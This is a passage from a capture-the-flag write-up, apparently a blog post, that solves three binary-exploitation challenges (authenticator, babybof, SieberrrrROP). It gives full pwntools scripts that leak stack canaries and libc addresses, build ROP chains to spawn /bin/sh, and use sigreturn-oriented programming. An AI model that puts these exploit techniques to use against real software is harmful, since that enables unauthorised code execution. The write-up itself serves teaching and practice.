      0x7ffff7faa000     0x7ffff7fac000     0x2000   0x20f000  rw-p   /mnt/c/stuff/ctf/old_comps/sieberr/pwn/pwn/authenticator/dist/libc.so.6
      0x7ffff7fac000     0x7ffff7fbb000     0xf000        0x0  rw-p
      0x7ffff7fbb000     0x7ffff7fbf000     0x4000        0x0  r--p   [vvar]
      0x7ffff7fbf000     0x7ffff7fc1000     0x2000        0x0  r-xp   [vdso]
      0x7ffff7fc1000     0x7ffff7fc2000     0x1000        0x0  r--p   /mnt/c/stuff/ctf/old_comps/sieberr/pwn/pwn/authenticator/dist/ld-2.41.so
      0x7ffff7fc2000     0x7ffff7ff0000    0x2e000     0x1000  r-xp   /mnt/c/stuff/ctf/old_comps/sieberr/pwn/pwn/authenticator/dist/ld-2.41.so
      0x7ffff7ff0000     0x7ffff7ffb000     0xb000    0x2f000  r--p   /mnt/c/stuff/ctf/old_comps/sieberr/pwn/pwn/authenticator/dist/ld-2.41.so
      0x7ffff7ffb000     0x7ffff7ffd000     0x2000    0x3a000  r--p   /mnt/c/stuff/ctf/old_comps/sieberr/pwn/pwn/authenticator/dist/ld-2.41.so
      0x7ffff7ffd000     0x7ffff7ffe000     0x1000    0x3c000  rw-p   /mnt/c/stuff/ctf/old_comps/sieberr/pwn/pwn/authenticator/dist/ld-2.41.so
      0x7ffff7ffe000     0x7ffff7fff000     0x1000        0x0  rw-p
      0x7ffffffdd000     0x7ffffffff000    0x22000        0x0  rw-p   [stack]
```
The libc leak will always be at a constant offset from the libc base. So we can calculate this offset as so.
```bash
>>> 0x00007ffff7dc4578 - 0x7ffff7d9a000 #leak - base
173432
```
Anyways, back to brute forcing. We can write a function that repeatedly chooses the reset_password option and appends one byte at a time until `memcmp` passes. It is possible that the payload could be disrupted (maybe by a newline character) so if it fails just run it again.  
```python
def leak_stack(length=48):
    payload = b''
    while(len(payload) != length):
        for i in range(0xFF):
            cur_pay = payload + bytes([i])
            p.sendlineafter(b'do?\n',b'2')
            p.sendafter(b'password: ',cur_pay)
            res = p.recvline()
            if(b'Incorrect' in res):
                continue
            else:
                payload = cur_pay
                print(f'status: {len(payload)/length}')
                break
        if len(cur_pay) != len(payload):
            print('fail fail fail')
    return payload
a = leak_stack()
# print(a)
log.info(f'{a}')
p.sendlineafter(b'do?\n',b'2')
p.sendafter(b'password: ',a)
passw = a[:16]
canary = u64(a[24:32])
libc_leak = u64(a[40:48])
log.info(f'{passw.hex(), hex(canary), hex(libc_leak)}')
```
Calculate the libc base
```python
base = libc_leak-173432
libc.address = base
log.info(f'libc {hex(libc.address)}')
```
Finally, we can now exploit the buffer overflow in authenticate.  
### Exploit 
Finding the offset in gdb. To do this we can jump to the vulnerable read function and set a breakpoint after it.  
```bash
pwndbg> cyclic 100
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
pwndbg> disass authenticate
Dump of assembler code for function authenticate:
   0x00000000000011c9 <+0>:     push   rbp
   0x00000000000011ca <+1>:     mov    rbp,rsp
   0x00000000000011cd <+4>:     sub    rsp,0x30
   0x00000000000011d1 <+8>:     mov    QWORD PTR [rbp-0x28],rdi
   0x00000000000011d5 <+12>:    mov    rax,QWORD PTR fs:0x28
   0x00000000000011de <+21>:    mov    QWORD PTR [rbp-0x8],rax
   0x00000000000011e2 <+25>:    xor    eax,eax
   0x00000000000011e4 <+27>:    lea    rax,[rip+0xe1d]        # 0x2008
   0x00000000000011eb <+34>:    mov    rdi,rax
   0x00000000000011ee <+37>:    mov    eax,0x0
   0x00000000000011f3 <+42>:    call   0x1060 <printf@plt>
   0x00000000000011f8 <+47>:    lea    rax,[rbp-0x20]
   0x00000000000011fc <+51>:    mov    edx,0x10
   0x0000000000001201 <+56>:    mov    rsi,rax
   0x0000000000001204 <+59>:    mov    edi,0x0
   0x0000000000001209 <+64>:    call   0x1070 <read@plt>
   0x000000000000120e <+69>:    mov    rcx,QWORD PTR [rbp-0x28]
   0x0000000000001212 <+73>:    lea    rax,[rbp-0x20]
   0x0000000000001216 <+77>:    mov    edx,0x10
   0x000000000000121b <+82>:    mov    rsi,rcx
   0x000000000000121e <+85>:    mov    rdi,rax
   0x0000000000001221 <+88>:    call   0x1080 <memcmp@plt>
   0x0000000000001226 <+93>:    test   eax,eax
   0x0000000000001228 <+95>:    je     0x1243 <authenticate+122>
   0x000000000000122a <+97>:    lea    rax,[rip+0xdfc]        # 0x202d
   0x0000000000001231 <+104>:   mov    rdi,rax
   0x0000000000001234 <+107>:   call   0x1030 <puts@plt>
   0x0000000000001239 <+112>:   mov    edi,0x0
   0x000000000000123e <+117>:   call   0x10c0 <exit@plt>
   0x0000000000001243 <+122>:   lea    rax,[rip+0xdf6]        # 0x2040
   0x000000000000124a <+129>:   mov    rdi,rax
   0x000000000000124d <+132>:   mov    eax,0x0
   0x0000000000001252 <+137>:   call   0x1060 <printf@plt>
   0x0000000000001257 <+142>:   lea    rax,[rbp-0x20]
   0x000000000000125b <+146>:   mov    edx,0x100
   0x0000000000001260 <+151>:   mov    rsi,rax
   0x0000000000001263 <+154>:   mov    edi,0x0
   0x0000000000001268 <+159>:   call   0x1070 <read@plt>
   0x000000000000126d <+164>:   nop
   0x000000000000126e <+165>:   mov    rax,QWORD PTR [rbp-0x8]
   0x0000000000001272 <+169>:   sub    rax,QWORD PTR fs:0x28
   0x000000000000127b <+178>:   je     0x1282 <authenticate+185>
   0x000000000000127d <+180>:   call   0x1040 <__stack_chk_fail@plt>
   0x0000000000001282 <+185>:   leave
   0x0000000000001283 <+186>:   ret
End of assembler dump.
pwndbg> b *authenticate+164
Breakpoint 1 at 0x126d: file authenticator.c, line 22.
pwndbg> start
Temporary breakpoint 2 at 0x140a: file authenticator.c, line 58.
...
pwndbg> jump *authenticate+122
Continuing at 0x555555555243.
Welcome, admin
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa

Breakpoint 1, authenticate (password=0x0) at authenticator.c:22
22      }
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
─────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────
*RAX  0x65
 RBX  0x7fffffffdd18 —▸ 0x7fffffffdf88 ◂— '/mnt/c/stuff/ctf/old_comps/sieberr/pwn/pwn/authenticator/dist/auth_patch'
*RCX  0x7ffff7e38ba6 ◂— movsxd rdx, eax
*RDX  0x65
*RDI  0
*RSI  0x7fffffffdbd0 ◂— 'aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa\n'
 R8   0
*R9   0
*R10  0
*R11  0x202
 R12  1
 R13  0
 R14  0x555555557d78 —▸ 0x555555555170 ◂— endbr64
 R15  0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe310 —▸ 0x555555554000 ◂— 0x10102464c457f
 RBP  0x7fffffffdbf0 ◂— 'eaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa\n'
 RSP  0x7fffffffdbc0 ◂— 0
*RIP  0x55555555526d (authenticate+164) ◂— nop
──────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────
 ► 0x55555555526d <authenticate+164>     nop
   0x55555555526e <authenticate+165>     mov    rax, qword ptr [rbp - 8]     RAX, [0x7fffffffdbe8] => 0x6161616161616164 ('daaaaaaa')
   0x555555555272 <authenticate+169>     sub    rax, qword ptr fs:[0x28]     RAX => 0x77ad4f1c0fdb0b64 (0x6161616161616164 - 0xe9b4124551865600)
   0x55555555527b <authenticate+178>   ✘ je     authenticate+185            <authenticate+185>

   0x55555555527d <authenticate+180>     call   __stack_chk_fail@plt        <__stack_chk_fail@plt>

   0x555555555282 <authenticate+185>     leave
   0x555555555283 <authenticate+186>     ret

   0x555555555284 <reset_password>       push   rbp
   0x555555555285 <reset_password+1>     mov    rbp, rsp
   0x555555555288 <reset_password+4>     sub    rsp, 0x130
   0x55555555528f <reset_password+11>    mov    qword ptr [rbp - 0x128], rdi
───────────────────────────────────────────────────[ SOURCE (CODE) ]────────────────────────────────────────────────────
In file: /mnt/c/stuff/ctf/old_comps/sieberr/pwn/pwn/authenticator/dist/authenticator.c:22
   17         exit(0);
   18     }
   19
   20     printf("Welcome, admin\n>> ");
   21     read(0, buffer, 0x100);
 ► 22 }
   23
   24 void reset_password(char *password){
   25     char buffer[0x100];
   26
   27     printf("Please enter your current password: ");
───────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────
00:0000│ rsp 0x7fffffffdbc0 ◂— 0
01:0008│-028 0x7fffffffdbc8 ◂— 0
02:0010│ rsi 0x7fffffffdbd0 ◂— 'aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa\n'
03:0018│-018 0x7fffffffdbd8 ◂— 'baaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa\n'
04:0020│-010 0x7fffffffdbe0 ◂— 'caaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa\n'
05:0028│-008 0x7fffffffdbe8 ◂— 'daaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa\n'
06:0030│ rbp 0x7fffffffdbf0 ◂— 'eaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa\n'
07:0038│+008 0x7fffffffdbf8 ◂— 'faaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa\n'
─────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────
 ► 0   0x55555555526d authenticate+164
   1 0x6161616161616166 None
   2 0x6161616161616167 None
   3 0x6161616161616168 None
   4 0x6161616161616169 None
   5 0x616161616161616a None
   6 0x616161616161616b None
   7 0x616161616161616c None
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> x/gx $rsp
0x7fffffffdbc0: 0x0000000000000000
pwndbg> x/gx $rbp
0x7fffffffdbf0: 0x6161616161616165
pwndbg> x/gx $rbp+8
0x7fffffffdbf8: 0x6161616161616166
pwndbg> cyclic -l 0x6161616161616166
Finding cyclic pattern of 8 bytes: b'faaaaaaa' (hex: 0x6661616161616161)
Found at offset 40
```
The offset to the saved return address is 40 bytes. So our payload should have 24 bytes of padding, followed by the stack canary, and 8 more bytes for the saved rbp. Subsequently we can do craft a rop chain using our libc.   
```python
p.sendlineafter(b'do?\n',b'1')
p.sendafter(b'password: ',passw)

offset = 40 #rbp+8
payload = b'A'*24 + p64(canary) + b'A'*8
rop = ROP(libc)

pop_rdi = rop.find_gadget(['pop rdi','ret']).address
ret = rop.find_gadget(['ret']).address
binsh = next(libc.search(b'/bin/sh\x00'))
system = libc.sym.system
payload += p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)
```
### Full solve script
```python
from pwn import *

context.binary = './auth_patch' #patchelf --set-interpreter ./ld-2.41.so auth_patch 
#readelf -l auth_patch| grep interpreter
#patchelf --set-rpath . auth_patch

elf = context.binary
p = process(elf.path)
# context.log_level = 'debug'
# context.terminal = ['tmux','splitw','-h']
# libc = elf.libc
libc = ELF('./libc.so.6')

def leak_stack(length=48):
    payload = b''
    while(len(payload) != length):
        for i in range(0xFF):
            cur_pay = payload + bytes([i])
            p.sendlineafter(b'do?\n',b'2')
            p.sendafter(b'password: ',cur_pay)
            res = p.recvline()
            if(b'Incorrect' in res):
                continue
            else:
                payload = cur_pay
                print(f'status: {len(payload)/length}')
                break
        if len(cur_pay) != len(payload):
            print('fail fail fail')
    return payload
a = leak_stack()
# print(a)
log.info(f'{a}')
p.sendlineafter(b'do?\n',b'2')
p.sendafter(b'password: ',a)
passw = a[:16]
canary = u64(a[24:32])
libc_leak = u64(a[40:48])
log.info(f'{passw.hex(), hex(canary), hex(libc_leak)}')
# gdb.attach(p)


base = libc_leak-173432 #>>> 0x00007ffff7dc4578 - 0x7ffff7d9a000
libc.address = base
log.info(f'libc {hex(libc.address)}')

# gdb.attach(p)

p.sendlineafter(b'do?\n',b'1')
p.sendafter(b'password: ',passw)

offset = 40 #rbp+8
payload = b'A'*24 + p64(canary) + b'A'*8
rop = ROP(libc)

pop_rdi = rop.find_gadget(['pop rdi','ret']).address
ret = rop.find_gadget(['ret']).address
binsh = next(libc.search(b'/bin/sh\x00'))
system = libc.sym.system
payload += p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)

# gdb.attach(p)
p.sendlineafter(b'>> ',payload)
# gdb.attach(p)
p.interactive()
```
## Babybof
I found this challenge quite interesting too. The canary leak was quite interesting.  
### Challenge protections
![babybof](/assets/images/sieberr-pwn/babybof.png)
### Source
```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

int tries = 1;

void init(){
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
}
    
void secret(){
    if(tries == 0) return;
    tries--;
    uint64_t addr = 0;
    scanf("%lu", &addr);
    printf("%lx\n", *(int64_t *)addr);
}

int main(){
    init();
    uint64_t choice;
    char buffer[0x10];

    while(1){
        printf("What would you like to do?\n");
        printf("1) Try BOF\n");
        printf("2) Try again\n");
        printf("3) Give up\n");
        scanf("%lu", &choice);
        getchar();
        switch(choice){
            case 1:
                fgets(buffer, sizeof(buffer) + 0x70, stdin);
                break;
            case 2:
                main();
                break;
            case 3:
                return 0;
            case 0x1337: //4919
                secret();
                break;
            default:
                printf("Invalid input: %lu\n", choice);
        }
    }
}
```
The programme gives us the choice to attempt a buffer overflow, call main again, exit, or call `secret()`. If your input is invalid, it prints `choice`.    
```c
void secret(){
    if(tries == 0) return;
    tries--;
    uint64_t addr = 0;
    scanf("%lu", &addr);
    printf("%lx\n", *(int64_t *)addr);
}
```
Essentialy, `secret()` allows us to input an arbitrary 64-bit integer address. It is treated as a memory address and gives us an arbitrary 8-byte memory read. However, we are only allowed to use this function once. Right now we don't know any addresses so we should move on to examine other parts of the programme first.  
In particular, `printf("Invalid input: %lu\n", choice);` this line looks promising. What would be printed if we entered an invalid input?  
```bash
What would you like to do?
1) Try BOF
2) Try again
3) Give up
22 #try random number
Invalid input: 22
What would you like to do?
1) Try BOF
2) Try again
3) Give up
.  #try non number
Invalid input: 22
```
Hmm okay. This behavour is expected because `scanf("%lu", &choice);` accepts only unsigned integers, so entering a '.' would cause it to fail. Anyways this isn't very helpful. So how can we make the programme print something more useful?  
Well, it is through the second option, where we can call `main` again.  
```bash
pwndbg> disass main
Dump of assembler code for function main:
   0x000055555540096d <+0>:     push   rbp  # new stack frame pushed
   0x000055555540096e <+1>:     mov    rbp,rsp  
   0x0000555555400971 <+4>:     sub    rsp,0x30
   0x0000555555400975 <+8>:     mov    rax,QWORD PTR fs:0x28
   0x000055555540097e <+17>:    mov    QWORD PTR [rbp-0x8],rax
   0x0000555555400982 <+21>:    xor    eax,eax
   0x0000555555400984 <+23>:    mov    eax,0x0
   0x0000555555400989 <+28>:    call   0x5555554008ba <init>
   0x000055555540098e <+33>:    lea    rdi,[rip+0x168]        # 0x555555400afd
   0x0000555555400995 <+40>:    call   0x555555400730 <puts@plt>
   0x000055555540099a <+45>:    lea    rdi,[rip+0x177]        # 0x555555400b18
   0x00005555554009a1 <+52>:    call   0x555555400730 <puts@plt>
   0x00005555554009a6 <+57>:    lea    rdi,[rip+0x176]        # 0x555555400b23
   0x00005555554009ad <+64>:    call   0x555555400730 <puts@plt>
   0x00005555554009b2 <+69>:    lea    rdi,[rip+0x177]        # 0x555555400b30
   0x00005555554009b9 <+76>:    call   0x555555400730 <puts@plt>
   0x00005555554009be <+81>:    lea    rax,[rbp-0x28]  # <- choice is at rbp-0x28
   0x00005555554009c2 <+85>:    mov    rsi,rax
   0x00005555554009c5 <+88>:    lea    rdi,[rip+0x128]        # 0x555555400af4
   0x00005555554009cc <+95>:    mov    eax,0x0
   0x00005555554009d1 <+100>:   call   0x555555400790 <__isoc99_scanf@plt>
```
We can see from the disassembly in gdb that choice is at rbp-0x28 initially. Whenever main is called, a new stack frame is pushed. Now, the previous location of choice should hold a different value in the new stack frame that is (hopefully) useful to us.  
We can test in GDB.  
```bash
pwndbg> c
Continuing.
What would you like to do?
1) Try BOF
2) Try again
3) Give up
2
What would you like to do?
1) Try BOF
2) Try again
3) Give up
-
Invalid input: 140737348250386
What would you like to do?
1) Try BOF
2) Try again
3) Give up
^C
pwndbg> x 140737348250386
0x7ffff7a62b12 <_IO_puts+418>:  0x0ffff883
```
Checking proc mappings:  
```bash
pwndbg> info proc mappings
process 1914
Mapped address spaces:

          Start Addr           End Addr       Size     Offset  Perms  objfile
      0x555555400000     0x555555401000     0x1000        0x0  r-xp   /mnt/c/stuff/ctf/old_comps/sieberr/pwn/pwn/babybof/dist/babybof/babybof_patched
      0x555555600000     0x555555601000     0x1000        0x0  r--p   /mnt/c/stuff/ctf/old_comps/sieberr/pwn/pwn/babybof/dist/babybof/babybof_patched
      0x555555601000     0x555555602000     0x1000     0x1000  rw-p   /mnt/c/stuff/ctf/old_comps/sieberr/pwn/pwn/babybof/dist/babybof/babybof_patched
      0x555555800000     0x555555801000     0x1000     0x3000  rw-p   /mnt/c/stuff/ctf/old_comps/sieberr/pwn/pwn/babybof/dist/babybof/babybof_patched
      0x555555a00000     0x555555a01000     0x1000     0x4000  rw-p   /mnt/c/stuff/ctf/old_comps/sieberr/pwn/pwn/babybof/dist/babybof/babybof_patched
      0x555555c00000     0x555555c01000     0x1000     0x5000  rw-p   /mnt/c/stuff/ctf/old_comps/sieberr/pwn/pwn/babybof/dist/babybof/babybof_patched
      0x7ffff79e2000     0x7ffff7bc9000   0x1e7000        0x0  r-xp   /mnt/c/stuff/ctf/old_comps/sieberr/pwn/pwn/babybof/dist/babybof/libc.so.6
      0x7ffff7bc9000     0x7ffff7dc9000   0x200000   0x1e7000  ---p   /mnt/c/stuff/ctf/old_comps/sieberr/pwn/pwn/babybof/dist/babybof/libc.so.6
      0x7ffff7dc9000     0x7ffff7dcd000     0x4000   0x1e7000  r--p   /mnt/c/stuff/ctf/old_comps/sieberr/pwn/pwn/babybof/dist/babybof/libc.so.6
      0x7ffff7dcd000     0x7ffff7dcf000     0x2000   0x1eb000  rw-p   /mnt/c/stuff/ctf/old_comps/sieberr/pwn/pwn/babybof/dist/babybof/libc.so.6
      0x7ffff7dcf000     0x7ffff7dd3000     0x4000        0x0  rw-p
      0x7ffff7dd3000     0x7ffff7dfc000    0x29000        0x0  r-xp   /mnt/c/stuff/ctf/old_comps/sieberr/pwn/pwn/babybof/dist/babybof/ld-2.27.so
      0x7ffff7ff4000     0x7ffff7ff6000     0x2000        0x0  rw-p
      0x7ffff7ff6000     0x7ffff7ffa000     0x4000        0x0  r--p   [vvar]
      0x7ffff7ffa000     0x7ffff7ffc000     0x2000        0x0  r-xp   [vdso]
      0x7ffff7ffc000     0x7ffff7ffd000     0x1000    0x29000  r--p   /mnt/c/stuff/ctf/old_comps/sieberr/pwn/pwn/babybof/dist/babybof/ld-2.27.so
      0x7ffff7ffd000     0x7ffff7ffe000     0x1000    0x2a000  rw-p   /mnt/c/stuff/ctf/old_comps/sieberr/pwn/pwn/babybof/dist/babybof/ld-2.27.so
      0x7ffff7ffe000     0x7ffff7fff000     0x1000        0x0  rw-p
      0x7ffffffdd000     0x7ffffffff000    0x22000        0x0  rw-p   [stack]
```
Yes! We got a libc leak as `140737348250386` is within the libc range.  
We can craft the first part of our exploit.  
```python
p.sendlineafter(b'up\n',b'2') 
p.sendlineafter(b'up\n',b'.')
p.recvuntil(b'input: ')
leak = int(p.recvline().strip())
print(hex(leak))
base = leak - (libc.sym.puts + 418)
libc.address = base
log.info(f'libc address {hex(libc.address)}')
```
Now, we have our libc base. However, we still cannot exploit the buffer overflow since we do not know the canary value.  
After a lot of guessing and experimenting in GDB, it turns out that the stack canary is stored in the Thread Local storage, which is at a constant offset from the libc base! Also I couldn't really find much proof of this but [this](https://archive.jro.sg/writeups/pwn/one-bullet.html) writeup by jro does reference it.  
```bash
pwndbg> canary
AT_RANDOM  = 0x7fffffffdf29 # points to global canary seed value
TLS Canary = 0x7ffff7ff55a8 # address where canary is stored
Canary     = 0x2d749b42a47bb500 (may be incorrect on != glibc)
Thread 1: Found valid canaries.
00:0000│  0x7fffffffb358 ◂— 0x2d749b42a47bb500
Additional results hidden. Use --all to see them.
```
Okay, now we know the address of the canary, but we still have to figure out its value. Remember the `secret()` function? We can just use that.  
```python
addr = libc.address + 6395304
p.sendlineafter(b'up\n',b'4919')
p.sendline(str(addr).encode())
canary = int(p.recvline().strip(),16)
# print(hex(canary))
log.info(f'canary {hex(canary)}')
```
We can also attach GDB to confirm just in case.  
![canary](/assets/images/sieberr-pwn/canary.png)
### Exploit
Finally, we can exploit our buffer overflow.  
Break after fgets (main+174) and use cyclic to find the offset of 40.  
```bash
pwndbg> x/gx $rbp+8
0x7fffffffdbe8: 0x6161616161616166
pwndbg> cyclic -l 0x6161616161616166
Finding cyclic pattern of 8 bytes: b'faaaaaaa' (hex: 0x6661616161616161)
Found at offset 40
```
Building our rop chain.  
```python
p.sendlineafter(b'up\n',b'1')
offset = 40
payload = b'A'*24 + p64(canary) + b'A'*8
rop = ROP(libc)
ret = rop.find_gadget(['ret']).address
pop_rdi = rop.find_gadget(['pop rdi','ret']).address
binsh = next(libc.search('/bin/sh\x00'))
system = libc.sym.system
payload += p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system) # ret for alignment
p.sendline(payload)
```
### Full Solve script
```python
from pwn import *

context.binary = './babybof_patched'
elf = context.binary
p = process(elf.path)
libc = ELF('./libc.so.6')
ld = ELF('./ld-2.27.so')
# context.log_level = 'debug'
# gdb.attach(p)
p.sendlineafter(b'up\n',b'2')  
p.sendlineafter(b'up\n',b'.')
p.recvuntil(b'input: ')
leak = int(p.recvline().strip())
print(hex(leak))
base = leak - (libc.sym.puts + 418)
libc.address = base
log.info(f'libc address {hex(libc.address)}')


addr = libc.address + 6395304
p.sendlineafter(b'up\n',b'4919')
p.sendline(str(addr).encode())
canary = int(p.recvline().strip(),16)
# print(hex(canary))
log.info(f'canary {hex(canary)}')

p.sendlineafter(b'up\n',b'1')
offset = 40
payload = b'A'*24 + p64(canary) + b'A'*8
rop = ROP(libc)
ret = rop.find_gadget(['ret']).address
pop_rdi = rop.find_gadget(['pop rdi','ret']).address
binsh = next(libc.search('/bin/sh\x00'))
system = libc.sym.system
payload += p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)
p.sendline(payload)
p.sendline(b'3')
p.interactive()
```
## SieberrrrROP
I tried this challenge after I recently learned about Sigreturn-Oriented Programming (SROP). Pretty nice solution honestly SROP is quite cool.  
### Challenge protections
![sieberrop](/assets/images/sieberr-pwn/Sieberop.png)

### Source
```
global _start

section .text
_start:
    ; Reserve 0x100 bytes on the stack for local buffer
    enter 0x100, 0x0

    ; Call the timer function to set an alarm
    call set_alarm

    ; Syscall: write(stdout, msg, msg_len)
    mov rax, 0x1          ; syscall number for write
    mov rdi, rax          ; file descriptor 1 (stdout)
    lea rsi, [rel msg]    ; pointer to message
    mov edx, msg_len      ; message length
    syscall

    ; Syscall: read(stdin, rsp, 0x1000)
    xor eax, eax          ; syscall number 0 (read)
    xor edi, edi          ; file descriptor 0 (stdin)
    mov rsi, rsp          ; buffer on stack
    mov edx, 0x1000       ; number of bytes to read
    syscall

    leave
    ret

set_alarm:
    ; Syscall: alarm(15)
    mov edi, 15
    mov eax, 37           ; syscall number for alarm
    syscall
    ret

section .data
    msg: db "As a pup, the wolf YEARNED for the /bin/sh"
    msg_len: equ $ - msg
```
We are given the Netwide Assembler (nasm) file. The program will start executing from `_start`. A good thing is that the source came with comments that tell us what the assembly is doing. Basically, it sets up a buffer of size 0x100, calls the `set_alarm` function which executes alarm(15), prints `msg` to stdout then allows us to read 0x1000 bytes into our buffer.  
### Solve
The first thing that came to my mind was to do a buffer overflow with a ROP chain to call a shell. However, if you run ROPgadget on the binary you will find that there are not really any suitable gadgets that we can use.  
![ropgad](/assets/images/sieberr-pwn/ropgadget.png)
In hindsight, perhaps it was quite obvious that this wasn't gonna work (but you never know...).  
Anyways, we should capitalise on the fact that the challenge name literally hints heavily towards SROP.  
#### SROP
A little bit about Sigreturn-Oriented Programming first. `Signals` are asynchronous interrupts delivered to a process. On x86-64 Linux, when a signal is delivered the kernel would stop the current process. The process states (RIP,RSP... other general purpose registers) are then saved onto the `user stack` as a structure called a `signal frame`.  
The kernel then redirects to a signal handler, and `SYS_rt_sigreturn` syscall is executed when it finishes. This syscall restores the old states from the stack. However, the kernel never checks if the `signal frame` was real. It just reads the memory at RSP, which if we control we can replace with our own `signal frame` and control code execution.  
The whole idea of SROP is to place our fake `signal frame` on the stack and trick the kernel that a signal handler has just finished so that it restores the registers to whatever is in our `signal frame`. To do so, we just need to set the `RAX` register to 15 and execute a syscall for `SYS_rt_sigreturn` (Usually we can do this with `mov eax, 15;syscall` gadget).  
#### Exploit
Anyways, we already learned from our gadget dump that there is no such `mov eax, 15` gadget. So how else can we cause a sigreturn? Well the next logical step would be to look at the only out of place call in the program, `alarm`.  
Looking at the man page for [alarm](https://man7.org/linux/man-pages/man2/alarm.2.html).  
```
RETURN VALUE         top
       alarm() returns the number of seconds remaining until any
       previously scheduled alarm was due to be delivered, or zero if
       there was no previously scheduled alarm.
```
Thus, taking into account the fact that return integer values of functions on x86 are stored in `rax`, AND the fact that `set_alarm` conveniently calls an alarm for 15 seconds, we can control `rax` to be 15 by simply calling `set_alarm` twice.  
Let's first figure out the addresses of all the stuff we need.  
Offset to return address:
```bash
pwndbg> disass _start
Dump of assembler code for function _start:
   0x0000000000401000 <+0>:     enter  0x100,0x0
   0x0000000000401004 <+4>:     call   0x40102f <set_alarm>
   0x0000000000401009 <+9>:     mov    eax,0x1
   0x000000000040100e <+14>:    mov    rdi,rax
   0x0000000000401011 <+17>:    lea    rsi,[rip+0xfe8]        # 0x402000
   0x0000000000401018 <+24>:    mov    edx,0x2a
   0x000000000040101d <+29>:    syscall
   0x000000000040101f <+31>:    xor    eax,eax
   0x0000000000401021 <+33>:    xor    edi,edi
   0x0000000000401023 <+35>:    mov    rsi,rsp
   0x0000000000401026 <+38>:    mov    edx,0x1000
   0x000000000040102b <+43>:    syscall
   0x000000000040102d <+45>:    leave
   0x000000000040102e <+46>:    ret
End of assembler dump.
pwndbg> b *_start+45
Breakpoint 1 at 0x40102d
pwndbg> r
Starting program: /mnt/c/stuff/ctf/old_comps/sieberr/pwn/pwn/SieberrrrROP/dist/SieberrrrROP/vuln

This GDB supports auto-downloading debuginfo from the following URLs:
  <https://debuginfod.ubuntu.com>
Debuginfod has been disabled.
To make this setting permanent, add 'set debuginfod enabled off' to .gdbinit.
As a pup, the wolf YEARNED for the /bin/shaaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaa
Breakpoint 1, 0x000000000040102d in _start ()
....
pwndbg> x/gx $rbp+8
0x7fffffffdcf0: 0x6261616161616169
pwndbg> cyclic -l 0x6261616161616169
Finding cyclic pattern of 8 bytes: b'iaaaaaab' (hex: 0x6961616161616162)
Found at offset 264
pwndbg> p/x 0x100+8
$1 = 0x108
pwndbg> p/i 0x100+8
Format letter "i" is meaningless in "print" command.
pwndbg> p/s 0x100+8
$2 = 264
```
`/bin/sh`  
```bash
pwndbg> search /bin/sh
Searching for byte: b'/bin/sh'
vuln            0x402023 0x68732f6e69622f /* '/bin/sh' */
```
`set_alarm` and `syscall ; ret` gadget  
```bash
pwndbg> disass set_alarm
Dump of assembler code for function set_alarm:
   0x000000000040102f <+0>:     mov    edi,0xf
   0x0000000000401034 <+5>:     mov    eax,0x25
   0x0000000000401039 <+10>:    syscall
   0x000000000040103b <+12>:    ret
End of assembler dump.
```
As for the `signal frame`, pwntools has a very useful object `SigreturnFrame()` that we can use.  
### Full solve script
```python
from pwn import *

context.binary = './vuln'
elf = context.binary
p = process(elf.path)

alarm = 0x40102f
syscall_ret = alarm+10
offset = 0x100 + 8
binsh = 0x402023

frame = SigreturnFrame()
frame.rax = constants.SYS_execve #we want to call execve(/bin/sh,0,0)
frame.rdi = binsh #address of /bin/sh
frame.rsi = 0  
frame.rdx = 0
frame.rip = syscall_ret #actually i think we could just use syscall for this without a ret but doesnt matter


payload = b'A'*offset + p64(alarm) + p64(alarm) +p64(syscall_ret)+ bytes(frame)
p.sendline(payload)
p.interactive()
```
